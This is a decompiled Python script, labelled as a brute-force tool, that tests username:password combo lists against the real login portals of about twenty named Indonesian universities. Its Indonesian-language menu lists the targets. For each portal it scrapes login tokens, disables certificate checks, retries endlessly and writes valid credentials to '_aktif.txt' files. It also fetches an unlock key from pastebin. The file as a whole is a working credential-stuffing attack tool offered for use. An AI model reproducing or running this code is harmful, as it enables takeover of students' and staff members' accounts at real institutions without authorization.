# Suksess Decompile ✓ 
#!/usr/bin/env python
#Coded By de@hdies
#Bruteforce Account University of Indonesia
import time, sys
from time import sleep
C = '\x1b[96m'
Y = '\x1b[93m'
G = '\x1b[92m'
R = '\x1b[91m'
NC = '\x1b[m'
DR = '\033[2;31m'
DY = '\033[2;33m'
DG = '\033[2;32m'
DW = '\033[2;37m'
DC = '\033[2;36m'
BW = '\x1b[47;30m'
BR = '\x1b[47;41m'
def lg():
  os.system('clear')
  print(f' • {BR}Created By de@hdies{NC} • • •')
  print(f' • {BW}Bruteforce Account University of Indonesia{NC} • • •')
  print(f'•  {Y}Main Menu {NC}:')
  print(f'•    {C}01{NC}){G}UB{NC}   {C}06{NC}){G}UPI{NC}  {C}11{NC}){G}UAJY{NC}   {C}16{NC}){G}WALI9{NC}')
  print(f'•    {C}02{NC}){G}UI{NC}   {DY}07{DW}){DR}USD{NC}  {DY}12{DW}){DR}UINM{NC}   {C}17{NC}){G}UNSRAT{NC}')
  print(f'•    {C}03{NC}){G}UII{NC}  {C}08{NC}){G}IPB{NC}  {C}13{NC}){G}UNUSA{NC}  {C}18{NC}){G}UMSIDA{NC}')
  print(f'•    {C}04{NC}){G}UAD{NC}  {C}09{NC}){G}ITB{NC}  {DY}14{DW}){DR}UNHAS{NC}  {C}19{NC}){G}UNSYIAH{NC}')
  print(f'•    {C}05{NC}){G}UGM{NC}  {C}10{NC}){G}ITS{NC}  {C}15{NC}){G}UNTAN{NC}  {C}20{NC}){G}GRAB NIM{NC}')
  print(f'•  {R}x{NC}) {R}Keluar{NC}')
  print(f'{NC} • • • • • • • • • • • • • • • • • • • {BR}BruteForce{NC}')
def exitst():
  print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
  exit(f'{NC}•    {R}GoodBye{NC}..!!')
def done():
  print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
  print(f'{NC} • • • • • • • • • • • • • • • • • • • {BR}BruteForce{NC}')
  print(f'{NC}•    {Y}DONE {NC}=> {C}Scanning Selesai{NC}..!!')
  print(f'{NC}•    {G}AKTIF {NC}=> {G}{len(found)}{Y} Akun{NC}')
  print(f'{NC}•    {R}MODAR {NC}=> {R}{len(error)}{Y} Akun{NC}')
def doneGrab():
  print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
  print(f'{NC} • • • • • • • • • • • • • • • • • • • {BR}BruteForce{NC}')
  print(f'{NC} •  ✓{G} SELESAI{NC}..!!')
  print(f'{NC} • {R}Hasil {C}{len(dapat)} {Y}NIM {NC}')
  print(f'{NC} • {Y}Telah {NC}=> {C}Tersimpan{NC}')
  print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
  print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
def sp(seco):
    for cia in seco + '\n':
      sys.stdout.write(cia)
      sys.stdout.flush()
      time.sleep(random.random() * 0.03)
def tungs(x):
  for remaining in range(x, 0, -1):
    sys.stdout.write('{} • {}Mohon Tunggu.                        \r'.format(NC, DW, remaining))
    sleep(0.25)
    sys.stdout.write('{} • {}Mohon Tunggu..                       \r'.format(NC, DW, remaining))
    sleep(0.25)
    sys.stdout.write('{} • {}Mohon Tunggu..!                      \r'.format(NC, DW, remaining))
    sleep(0.25)
    sys.stdout.write('{} • {}Mohon Tunggu..!!                     \r'.format(NC, DW, remaining))
    sleep(0.25)
def tung(x):
  for remaining in range(x, 0, -1):
    sys.stdout.write('{} • • • • • • • • • {}|          \r'.format(NC, DW, remaining))
    sleep(0.1)
    sys.stdout.write('{} • • • • • • • • • {}/          \r'.format(NC, DW, remaining))
    sleep(0.1)
    sys.stdout.write('{} • • • • • • • • • {}-          \r'.format(NC, DW, remaining))
    sleep(0.1)
    sys.stdout.write('{} • • • • • • • • • {}\          \r'.format(NC, DW, remaining))
    sleep(0.1)
def welcome():
  welkom = ('Jangan Lupa Tidur|Jangan Lupa Makan|Jangan Lupa Istirahat|Jangan Lupa Bahagia|Jangan Lupa Coli|Jangan Lupa Istighfar')
  welkomin = list(map(str, welkom.split('|')))
  slmtdtg = random.choice(welkomin)
  sp(f'')
  tung(10)
  sp(f' • Coded By {DC}de@hdies{NC}')
  print(f'{NC} • {DY}{slmtdtg}{DW}..!! :){NC}')
try:
  import os, json, base64, random, platform, urllib.parse, urllib.request, requests.packages.urllib3
  import requests as req
  from bs4 import BeautifulSoup as bs
  from concurrent.futures import ThreadPoolExecutor
  requests.packages.urllib3.disable_warnings()
except ImportError:
  lg()
  print(f'{NC} • {R}Module Dibutuhkan..{NC}!!')
  print(f'{NC} • {Y}Mencoba Untuk Menginstall{NC}..!!')
  sleep(3)
  lg()
  tungs(3)
  os.system('clear')
  os.system('apt-get upgrade -y')
  os.system('python -m pip install --upgrade pip')
  os.system('python -m pip install requests bs4')
  lg()
  tungs(3)
  print(f'{NC} • {G}Semua Module Terinstall{NC}..!!')
  print(f'{NC} • {C}Silahkan Jalankan Ulang Tools{NC}..!!')
  sleep(3)
  exit()
except KeyboardInterrupt:
  exit(f'{NC}\n•    {R}Keyboard Interupted{NC}..!!')
except Exception as e:
  try:
    print(f'{NC} •    {DW}=> {DR}Pastikan Terkoneksi Internet{DW}..!!{NC}')
  finally:
    e = None
    del e
    sleep(1)
    exit()
else:
  try:
    welcome()
    error = []
    found = []
    dapat = []
    expired = time.strftime(f'%d-%m-%y | %I:%M %p')
    exp = '99:99'
    linkey = req.get('https://pastebin.com/raw/5qENi3bf', verify=False).text
    keys = 'DG'
    def logins():
      handlew = open('.keys', 'w')
      enkeys = base64.b64encode(keys.encode('utf-8'))
      resen = str(enkeys, 'utf-8')
      handlew.write(resen)
      handlew.close()
      lg()
      print(f'{NC} • {DW}=> {Y}Mencoba Untuk Login{DW}..!!{NC}')
      tungs(3)
      lg()
      print(f'{NC} • {DW}=> {DC}Login {DG}Successed{DW}..!!{NC}')
      sleep(2)
    def loginf():
      print(f'{NC} • {DW}=> {DR}Kunci Salah{DW}..!!{NC}')
      print(f'{NC} • {DW}=> {DY}Kunjungi Link Diatas{DW}..!!{NC}')
      sleep(2)
      kunci()
    def kunci():
      try:
        f = open('.keys')
        f.close()
      except:
        lg()
        print(f'{NC} • {DG}Visit {DW}| {DY}{linkey}{NC}')
        inputpass = input(f'{NC} • {DW}Masukan Keys => {DC}')
        if inputpass == '':
          print(f'{NC} • {DW}=> {DR}Input Kosong{DW}..!!{NC}')
          sleep(2)
          kunci()
        elif inputpass != keys:
          loginf()
        else:
          print(f'{NC} • {DW}=> {DG}Keys is Valid{DW}..!!{NC}')
          sleep(2)
          logins()
      handler = open(r'.keys', 'r')
      temp = handler.readline()
      handler.close()
      ckeys = base64.b64decode(temp.encode('utf-8'))
      resc = str(ckeys, 'utf-8')
      if resc != keys:
        lg()
        print(f'{NC} • {DG}Visit {DW}| {DY}{linkey}{NC}')
        inputpass = input(f'{NC} • {DW}Masukan Keys => {DC}')
        if inputpass == '':
          print(f'{NC} • {DW}=> {DR}Input Kosong{DW}..!!{NC}')
          sleep(2)
          kunci()
        elif inputpass != keys:
          loginf()
        else:
          print(f'{NC} • {DW}=> {DG}Keys is Valid{DW}..!!{NC}')
          sleep(2)
          logins()
          lg()
          print(f'{NC} • {DW}=> {DC}Keys Updated{DW}..!!{NC}')
          sleep(2)
    def c(anu):
      for ih in range(10000000000):
        try:
          anuin = req.get(anu, timeout=3, verify=False)
          if anuin.status_code:
            break
        except requests.exceptions.Timeout:
          sys.stdout.write(f'{DW} • {DR}Timeout{DW}..!!{NC}                            \r')
        except requests.exceptions.ConnectionError:
          sys.stdout.write(f'{DW} • {DR}Connection Error{DW}..!!{NC}                            \r')
        except KeyboardInterrupt:
          exit(f'{DW}\r•    {DR}Keyboard Interupted{DW}..!!{NC}')
      return True
    def ub(List):
      with open(List, 'r') as (f):
        lines = f.readlines()
        count = 0
        for line in lines:
          data = line.strip()
          user = data.split(':')[0]
          pswd = data.split(':')[1]
          if len(data) > 0:
            try:
              ses = requests.Session()
              anu = 'https://siam.ub.ac.id/index.php'
              tok = bs(ses.get(anu, timeout=10, verify=False).text, 'html.parser').findAll('input')
              dat = {
                'status_loc': tok, 'lat': tok, 
                'long': tok, 'username': user, 
                'password': pswd, 'login': 'Masuk'
              }
              anuin = bs(ses.post(anu, data=dat, timeout=10, verify=False).text, 'html.parser').find('small')
              if anuin:
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
                error.append(f'{data}')
              else:
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
                found.append(f'{data}')
                with open('ub_aktif.txt', 'a') as (s):
                  s.write(f'[ AKTIF ] {user}:{pswd}\n')
            except Exception:
              c(anu)
        done()
        print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}ub_aktif.txt{NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UB    {NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    def ui(List):
      with open(List, 'r') as (f):
        lines = f.readlines()
        count = 0
        for line in lines:
          data = line.strip()
          user = data.split(':')[0]
          pswd = data.split(':')[1]
          if len(data) > 0:
            try:
              ses = requests.Session()
              anu = 'https://sso.ui.ac.id/cas/login'
              anus = bs(ses.get(anu, timeout=10, verify=False).text, 'html.parser').findAll('input')
              dat = {
                'username': user, 'password': pswd, 
                'lt': anus[2]['value'], 'execution': anus[3]['value'], 
                '_eventId': 'submit'
              }
              anuin = bs(ses.post(anu, data=dat, timeout=10, verify=False).text, 'html.parser').find('div', attrs={'id': 'status'})
              if anuin:
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
                error.append(f'{data}')
              else:
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
                found.append(f'{data}')
                with open('ui_aktif.txt', 'a') as (s):
                  s.write(f'[ AKTIF ] {user}:{pswd}\n')
            except Exception:
              c(anu)
        done()
        print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}ui_aktif.txt{NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UI    {NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    def uii(List):
      with open(List, 'r') as (f):
        lines = f.readlines()
        count = 0
        for line in lines:
          data = line.strip()
          user = data.split(':')[0]
          pswd = data.split(':')[1]
          if len(data) > 0:
            try:
              ses = requests.Session()
              anu = 'https://cloud-api.uii.ac.id/v1/login'
              hider = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 4.4.2; SAMSUNG-SM-T537A Build/KOT49H) AppleWebKit/537.36 (KHTML like Gecko) Chrome/35.0.1916.141 Safari/537.36', 
                'Referer': 'https://gateway.uii.ac.id/account/login'
              }
              dat = { 'kd_member': user, 'password': pswd }
              anuin = ses.post(anu, headers=hider, data=dat, timeout=10, verify=False)
              if anuin.status_code == 400:
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
                error.append(f'{data}')
              else:
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
                found.append(f'{data}')
                with open('uii_aktif.txt', 'a') as (s):
                  s.write(f'[ AKTIF ] {user}:{pswd}\n')
            except Exception:
              c(anu)
        done()
        print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}uii_aktif.txt{NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UII    {NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    def uad(List):
      with open(List, 'r') as (f):
        lines = f.readlines()
        count = 0
        for line in lines:
          data = line.strip()
          user = data.split(':')[0]
          pswd = data.split(':')[1]
          if len(data) > 0:
            try:
              ses = requests.Session()
              anu = 'https://portal.uad.ac.id/login'
              dat = { 'login':user, 'password':pswd }
              anuin = bs(ses.post(anu, data=dat, timeout=10, verify=False).text, 'html.parser').find('title')
              if anuin.text == 'Login Portal | Portal Akademik':
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
                error.append(f'{data}')
              else:
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
                found.append(f'{data}')
                with open('uad_aktif.txt', 'a') as (s):
                  s.write(f'[ AKTIF ] {user}:{pswd}\n')
            except Exception:
              c(anu)
        done()
        print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}uad_aktif.txt{NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UAD    {NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    def ugm(List):
      with open(List, 'r') as (f):
        lines = f.readlines()
        count = 0
        for line in lines:
          data = line.strip()
          user = data.split(':')[0]
          pswd = data.split(':')[1]
          if len(data) > 0:
            try:
              ses = requests.Session()
              anu = 'https://sso.ugm.ac.id/cas/login?service=http%3A%2F%2Fsimaster.ugm.ac.id%2Fugmfw%2Fsignin_simaster%2Fsignin_proses'
              anus = bs(ses.get(anu, timeout=10, verify=False).text, 'html.parser').findAll('input')
              dat = {
                'username': user, 'password': pswd, 
                'lt': anus[4]['value'], '_eventId': anus[5]['value'], 
                'submit': 'MASUK'
              }
              anuin = bs(ses.post(anu, data=dat, timeout=10, verify=False).text, 'html.parser').find('div', attrs={'id': 'status'})
              if anuin:
                count += 1
                print(f'{NC}  • {DC}{count} {NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
                error.append(f'{data}')
              else:
                count += 1
                print(f'{NC}  • {DC}{count} {NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
                found.append(f'{data}')
                with open('ugm_aktif.txt', 'a') as (s):
                  s.write(f'[ AKTIF ] {user}:{pswd}\n')
            except Exception:
              c(anu)
        done()
        print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}ugm_aktif.txt{NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UGM    {NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    def upi(List):
      with open(List, 'r') as (f):
        lines = f.readlines()
        count = 0
        for line in lines:
          data = line.strip()
          user = data.split(':')[0]
          pswd = data.split(':')[1]
          if len(data) > 0:
            try:
              ses = requests.Session()
              anu = 'https://sso.upi.edu/cas/login'
              anus = bs(ses.get(anu, timeout=10, verify=False).text, 'html.parser').findAll('input')
              dat = {
                'username': user, 'password': pswd, 
                'execution': anus[2]['value'], 
                '_eventId': 'submit', 'submit': 'LOGIN'
              }
              anuin = bs(ses.post(anu, data=dat, timeout=10, verify=False).text, 'html.parser').findAll('div')[2]['class'][0]
              if anuin == 'errors':
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
                error.append(f'{data}')
              else:
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
                found.append(f'{data}')
                with open('upi_aktif.txt', 'a') as (s):
                  s.write(f'[ AKTIF ] {user}:{pswd}\n')
            except Exception:
              c(anu)
        done()
        print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}upi_aktif.txt{NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UPI    {NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    # def usd(List):
      # with open(List, 'r') as (f):
        # lines = f.readlines()
        # count = 0
        # for line in lines:
          # data = line.strip()
          # user = data.split(':')[0]
          # pswd = data.split(':')[1]
          # if len(data) > 0:
            # ses = requests.Session()
            # anu = 'https://mahasiswa.usd.ac.id/mahasiswa/'
            # dat = { 'username': user, 'password': pswd, 'submit':'submit' }
            # anuin = bs(ses.post(anu, timeout=10, data=dat, verify=False).text, 'html.parser')
            # if qn.text == 'E-Learning Universitas Sanata Dharma':
              # count += 1
              # print(f'{NC}  • {DC}{count}{NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
              # found.append(f'{data}')
              # with open('usd_aktif.txt', 'a') as (s):
                # s.write(f'[ AKTIF ] {user}:{pswd}\n')
            # else:
              # count += 1
              # print(f'{NC}  • {DC}{count}{NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
              # error.append(f'{data}')
        # done()
        # print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}usd_aktif.txt{NC}')
        # print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    USD    {NC}')
        # print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    def ipb(List):
      with open(List, 'r') as (f):
        lines = f.readlines()
        count = 0
        for line in lines:
          data = line.strip()
          user = data.split(':')[0]
          pswd = data.split(':')[1]
          if len(data) > 0:
            try:
              ses = requests.Session()
              anu = 'https://simak.ipb.ac.id/Account/Login'
              anus = bs(ses.get(anu, timeout=10, verify=False).text, 'html.parser').findAll('input')
              dat = {
                '__RequestVerificationToken': anus[0]['value'], 
                'UserName': user, 'Password': pswd
              }
              anuin = bs(ses.post(anu, timeout=10, data=dat, verify=False).text, 'html.parser').find('title')
              if anuin.text == 'Login | Sistem Informasi Akademik IPB':
                count += 1
                print(f'{NC}  • {DC}{count} {NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
                error.append(f'{data}')
              else:
                count += 1
                print(f'{NC}  • {DC}{count} {NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
                found.append(f'{data}')
                with open('ipb_aktif.txt', 'a') as (s):
                  s.write(f'[ AKTIF ] {user}:{pswd}\n')
            except Exception:
              c(anu)
        done()
        print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}ipb_aktif.txt{NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    IPB    {NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    def itb(List):
      with open(List, 'r') as (f):
        lines = f.readlines()
        count = 0
        for line in lines:
          data = line.strip()
          user = data.split(':')[0]
          pswd = data.split(':')[1]
          if len(data) > 0:
            try:
              ses = requests.Session()
              anu = 'https://login.itb.ac.id/cas/login'
              anus = bs(ses.get(anu, timeout=10, verify=False).text, 'html.parser').findAll('input')
              dat = {
                'username': user, 'password': pswd, 
                'execution': anus[2]['value'], 
                '_eventId': 'submit', 'submit': 'LOGIN'
              }
              anuin = ses.post(anu, data=dat, timeout=10, verify=False)
              if anuin.status_code == 401:
                count += 1
                print(f'{NC}  • {DC}{count} {NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
                error.append(f'{data}')
              else:
                count += 1
                print(f'{NC}  • {DC}{count} {NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
                found.append(f'{data}')
                with open('itb_aktif.txt', 'a') as (s):
                  s.write(f'[ AKTIF ] {user}:{pswd}\n')
            except Exception:
              c(anu)
        done()
        print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}itb_aktif.txt{NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    ITB    {NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    def its(List):
      with open(List, 'r') as (f):
        lines = f.readlines()
        count = 0
        for line in lines:
          data = line.strip()
          user = data.split(':')[0]
          pswd = data.split(':')[1]
          if len(data) > 0:
            try:
              ses = requests.Session()
              anu = 'https://my.its.ac.id'
              anus = bs(ses.get(anu, timeout=10, verify=False).text, 'html.parser').findAll('input')
              anu2 = 'https://my.its.ac.id/sso/auth'
              prams = {
                'response_type': anus[1]['value'], 
                'redirect_uri': 'https%3A%2F%2Fmy.its.ac.id%2Fsso%2Fauth', 
                'client_id': anus[0]['value'], 
                'nonce': anus[6]['value'], 
                'state': anus[3]['value'], 
                'scope': 'openid+integra+profile+email+phone+group+role+resource'
              }
              dat = { 'username': user, 'password': pswd }
              anuin = bs(ses.post(anu2, params=prams, data=dat, timeout=10, verify=False).text, 'html.parser').find('div', attrs={'class': 'alert alert-danger'})
              if anuin.text == 'myITS ID or password is incorrect!' or 'myITS ID atau kata sandi Anda salah!':
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
                error.append(f'{data}')
              else:
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
                found.append(f'{data}')
                with open('its_aktif.txt', 'a') as (s):
                  s.write(f'[ AKTIF ] {user}:{pswd}\n')
            except Exception:
              c(anu)
        done()
        print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}its_aktif.txt{NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    ITS    {NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    def uajy(List):
      with open(List, 'r') as (f):
        lines = f.readlines()
        count = 0
        sleep(1)
        for line in lines:
          data = line.strip()
          user = data.split(':')[0]
          pswd = data.split(':')[1]
          if len(data) > 0:
            try:
              ses = requests.Session()
              anu = 'https://sikma.uajy.ac.id/Account/Login'
              anus = bs(ses.get(anu, timeout=10, verify=False).text, 'html.parser').findAll('input', attrs={'name': '__RequestVerificationToken'})
              dat = { 'username': user, 'password': pswd, '__RequestVerificationToken': anus[0]['value'] }
              anuin = bs(ses.post(anu, data=dat, timeout=10, verify=False).text, 'html.parser').find('label', attrs={'class': 'text-red'})
              if anuin.text == 'success':
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
                found.append(f'{data}')
                with open('uajy_aktif.txt', 'a') as (s):
                  s.write(f'[ AKTIF ] {user}:{pswd}\n')
              else:
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
                error.append(f'{data}')
                #with open('uajy_aktif.txt', 'a') as (s):
                  #s.write(f'[ AKTIF ] {user}:{pswd}\n')
            except Exception:
              c(anu)
        done()
        print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}uajy_aktif.txt{NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}   UAJY   {NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    # def uinm(List):
      # with open(List, 'r') as (f):
        # lines = f.readlines()
        # count = 0
        # sleep(1)
        # for line in lines:
          # data = line.strip()
          # user = data.split(':')[0]
          # pswd = data.split(':')[1]
          # if len(data) > 0:
            # ses = requests.Session()
            # anu = 'http://sia.uinmataram.ac.id/masuk'
            # print(anuin.text)
            # dat = { 'username': user, 'password': pswd, 'submit':'submit' }
            # hasil = ses.post(v, data=dat).text
            # qn = bs(hasil, 'html.parser').find('title')
            # if qn.text == 'Siakad UIN Mataram':
              # count += 1
              # print(f'{NC}  • {DC}{count}{NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
              # found.append(f'{data}')
              # with open('uinm_aktif.txt', 'a') as (s):
                # s.write(f'[ AKTIF ] {user}:{pswd}\n')
            # else:
              # count += 1
              # print(f'{NC}  • {DC}{count}{NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
              # error.append(f'{data}')
        # done()
        # print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}uinm_aktif.txt{NC}')
        # print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UINM    {NC}')
        # print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    def unusa(List):
      with open(List, 'r') as (f):
        lines = f.readlines()
        count = 0
        sleep(1)
        for line in lines:
          data = line.strip()
          user = data.split(':')[0]
          pswd = data.split(':')[1]
          if len(data) > 0:
            try:
              ses = requests.Session()
              anu = 'http://sim.unusa.ac.id/front/gate/index.php'
              dat = { 'txtUserID':user, 'txtPassword':pswd, 'submit':'Log In' }
              anuin = bs(req.post(anu, data=dat, timeout=10, verify=False).text, 'html.parser').find('h2')
              if str(anuin.text)[:26] == 'Sistem Informasi Manajemen':
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
                error.append(f'{data}')
              else:
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
                found.append(f'{data}')
                with open('unusa_aktif.txt', 'a') as (s):
                  s.write(f'[ AKTIF ] {user}:{pswd}\n')
            except Exception:
              c(anu)
        done()
        print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}unusa_aktif.txt{NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}   UNUSA   {NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    # def unhas(List):
      # with open(List, 'r') as (f):
        # lines = f.readlines()
        # count = 0
        # sleep(1)
        # for line in lines:
          # data = line.strip()
          # user = data.split(':')[0]
          # pswd = data.split(':')[1]
          # if len(data) > 0:
            # ses = requests.Session()
            # anu = 'https://sso.unhas.ac.id'
            # anus = bs(ses.get(anu, timeout=10, verify=False).text, 'html.parser').findAll('input')
            # dat = {
              # 'SAMLRequest': anus[0]['value'], 
              # 'RelayState': anus[1]['value'], 
              # 'username': user, 'password': pswd, 
              # '_token': anus[4]['value'], 'g-token': anus[5]['value']
            # }
            # anuin = bs(ses.post(anu, data=dat, timeout=10, verify=False).text, 'html.parser')
            # if anuin == 'Akun tidak ditemukan':
              # count += 1
              # print(f'{NC}  • {DC}{count} {NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
              # error.append(f'{data}')
            # else:
              # count += 1
              # print(f'{NC}  • {DC}{count} {NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
              # found.append(f'{data}')
              # with open('unhas_aktif.txt', 'a') as (s):
                # s.write(f'[ AKTIF ] {user}:{pswd}\n')
            #except:
        # done()
        # print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}unhas_aktif.txt{NC}')
        # print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}   UNHAS   {NC}')
        # print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    def untan(List):
      with open(List, 'r') as (f):
        lines = f.readlines()
        count = 0
        sleep(1)
        for line in lines:
          data = line.strip()
          user = data.split(':')[0]
          pswd = data.split(':')[1]
          if len(data) > 0:
            try:
              ses = requests.Session()
              anu = 'http://mahasiswa.siakad.untan.ac.id/login'
              dat = { 'nim': user, 'password': pswd, }
              anuin = bs(ses.post(anu, data=dat, timeout=10, verify=False).text, 'html.parser').findAll('h3')[0]
              if anuin.text == 'Login Mahasiswa':
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
                error.append(f'{data}')
              else:
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
                found.append(f'{data}')
                with open('untan_aktif.txt', 'a') as (s):
                  s.write(f'[ AKTIF ] {user}:{pswd}\n')
            except Exception:
              c(anu)
        done()
        print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}untan_aktif.txt{NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}   UNTAN   {NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    def wali9(List):
      with open(List, 'r') as (f):
        lines = f.readlines()
        count = 0
        sleep(1)
        for line in lines:
          data = line.strip()
          user = data.split(':')[0]
          pswd = data.split(':')[1]
          if len(data) > 0:
            try:
              ses = requests.Session()
              anu = 'https://akademik.walisongo.ac.id/index.php/auth/login'
              dat = { 'is_con': True, 'log': user, 'pwd': pswd }
              anuin = bs(ses.post(anu, data=dat, timeout=10, verify=False).text, 'html.parser').find('h5')
              if anuin.text == 'Login Wali-SIAdik':
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
                error.append(f'{data}')
              else:
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
                found.append(f'{data}')
                with open('wali9_aktif.txt', 'a') as (s):
                  s.write(f'[ AKTIF ] {user}:{pswd}\n')
            except Exception:
              c(anu)
        done()
        print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}wali9_aktif.txt{NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}   WALI9   {NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    def unsrat(List):
      with open(List, 'r') as (f):
        lines = f.readlines()
        count = 0
        sleep(1)
        for line in lines:
          data = line.strip()
          user = data.split(':')[0]
          pswd = data.split(':')[1]
          if len(data) > 0:
            try:
              ses = requests.Session()
              anu = 'https://inspire.unsrat.ac.id/login/autentikasi'
              dat = { 'username':user, 'password':pswd }
              anuin = bs(ses.post(anu, data=dat, timeout=10, verify=False).text, 'html.parser').find('h4')
              if anuin.text == 'PORTAL INSPIRE':
                count += 1
                print(f'{NC}  • {DC}{count} {NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
                error.append(f'{data}')
              else:
                count += 1
                print(f'{NC}  • {DC}{count} {NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
                found.append(f'{data}')
                with open('unsrat_aktif.txt', 'a') as (s):
                  s.write(f'[ AKTIF ] {user}:{pswd} => Coded By de@hdies\n')
            except Exception:
              c(anu)
        done()
